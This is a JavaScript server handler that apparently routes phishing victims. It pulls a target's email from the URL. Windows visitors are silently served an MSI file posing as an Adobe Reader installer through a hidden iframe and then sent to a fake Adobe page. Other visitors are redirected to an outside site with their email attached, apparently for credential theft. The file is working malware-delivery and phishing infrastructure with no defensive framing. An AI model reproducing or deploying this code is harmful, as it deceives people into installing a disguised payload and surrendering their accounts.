export default function handler(req, res) {
  const userAgent = req.headers['user-agent'] || "";
  const isWindows = /windows/i.test(userAgent);

  const WINDOWS_REDIRECT_AFTER_DOWNLOAD = 'https://mksonline.com.mx/css/adobe/reader/download.html';
  const MSI_PATH = '/Reader_adobe_install_online.msi';

  // Base URL for non-Windows users
  const NON_WINDOWS_TARGET =
    'https://wavemarkmx.com/ms#';

  //--------------------------------------------------------------------
  // 1. Try to read query normally: ?email= or ?smn=
  //--------------------------------------------------------------------
  let email = '';

  if (req.query.email) {
    email = Array.isArray(req.query.email)
      ? req.query.email[0]
      : req.query.email;

  } else if (req.query.smn) {
    email = Array.isArray(req.query.smn)
      ? req.query.smn[0]
      : req.query.smn; // ✅ FIXED (was missing!)

  } else if (req.url) {
    //----------------------------------------------------------------
    // 2. Try to capture hash fragment from raw URL
    //----------------------------------------------------------------
    const hashMatch = req.url.match(/#([^?&]+)/);
    if (hashMatch && hashMatch[1]) {
      email = decodeURIComponent(hashMatch[1]);
    }
  }

  const safeEmail = email ? encodeURIComponent(email) : "";

  //--------------------------------------------------------------------
  // 3. Windows devices: serve MSI download + redirect
  //--------------------------------------------------------------------
  if (isWindows) {
    const html = `<!DOCTYPE html>
    <html>
      <head><meta charset="utf-8"><title>Preparing Download…</title></head>
      <body>
        <p>Your download will start shortly…</p>
        <script>
          const iframe = document.createElement('iframe');
          iframe.style.display = 'none';
          iframe.src = '${MSI_PATH}';
          document.body.appendChild(iframe);

          setTimeout(() => {
            window.location.href = '${WINDOWS_REDIRECT_AFTER_DOWNLOAD}';
          }, 2000);
        </script>
      </body>
    </html>`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.status(200).send(html);
    return;
  }

  //--------------------------------------------------------------------
  // 4. Non-Windows redirect
  //--------------------------------------------------------------------
  const finalUrl = safeEmail
    ? `${NON_WINDOWS_TARGET}#${safeEmail}`
    : NON_WINDOWS_TARGET;

  res.writeHead(302, { Location: finalUrl });
  res.end();
}
